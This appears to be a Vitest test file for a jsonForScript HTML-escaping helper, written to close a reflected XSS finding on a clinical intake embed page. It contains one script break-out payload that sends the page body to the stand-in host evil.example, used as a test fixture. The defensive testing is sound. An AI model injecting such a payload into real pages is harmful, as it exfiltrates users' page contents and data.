import { describe, it, expect } from "vitest";
import { jsonForScript } from "./html-safe";

/**
 * Acceptance criteria for code review finding CR-01: a reflected XSS on `/quiz-embed`, the page
 * that collects the clinical intake. Six `url.searchParams` values reach an inline `<script>`.
 */

const BREAKOUT = "</script><script>fetch('https://evil.example/'+document.body.innerHTML)</script>";

describe("jsonForScript", () => {
  it("is not vacuous — JSON.stringify really does leave the break-out intact", () => {
    // If this assertion ever fails, the platform changed and the rest of this file needs revisiting.
    expect(JSON.stringify(BREAKOUT)).toContain("</script>");
  });

  it("emits no closing-tag sequence for a break-out payload", () => {
    const out = jsonForScript(BREAKOUT);
    expect(out).not.toContain("</script>");
    expect(out).not.toContain("<");
    expect(out).not.toContain(">");
  });

  it("escapes every angle bracket and ampersand", () => {
    expect(jsonForScript("<")).toBe('"\\u003c"');
    expect(jsonForScript(">")).toBe('"\\u003e"');
    expect(jsonForScript("&")).toBe('"\\u0026"');
  });

  it("escapes the two JavaScript line terminators that are legal JSON", () => {
    expect(jsonForScript(String.fromCharCode(0x2028))).toBe('"\\u2028"');
    expect(jsonForScript(String.fromCharCode(0x2029))).toBe('"\\u2029"');
  });

  // The escapes must be transport-only. If they changed the parsed value, the quiz would receive
  // different config than the merchant set.
  it("round-trips to the identical value", () => {
    for (const input of [
      BREAKOUT,
      "/products/allergy-consultation",
      "<>&",
      String.fromCharCode(0x2028, 0x2029),
      "plain",
      "",
    ]) {
      expect(JSON.parse(jsonForScript(input))).toBe(input);
    }
  });

  it("round-trips non-string values", () => {
    expect(JSON.parse(jsonForScript(true))).toBe(true);
    expect(JSON.parse(jsonForScript(42))).toBe(42);
    expect(JSON.parse(jsonForScript(null))).toBe(null);
    expect(JSON.parse(jsonForScript({ a: "<b>" }))).toEqual({ a: "<b>" });
  });

  it("never returns the literal undefined, which would be a syntax error inline", () => {
    expect(jsonForScript(undefined)).toBe("null");
    expect(jsonForScript({ toJSON: () => undefined })).toBe("null");
  });

  // The emitted text is interpolated bare into a script body, so it must be parseable as an
  // expression on its own.
  it("output is a valid JavaScript expression", () => {
    const out = jsonForScript(BREAKOUT);
    expect(() => Function(`"use strict"; return (${out});`)).not.toThrow();
    expect(Function(`"use strict"; return (${out});`)()).toBe(BREAKOUT);
  });
});
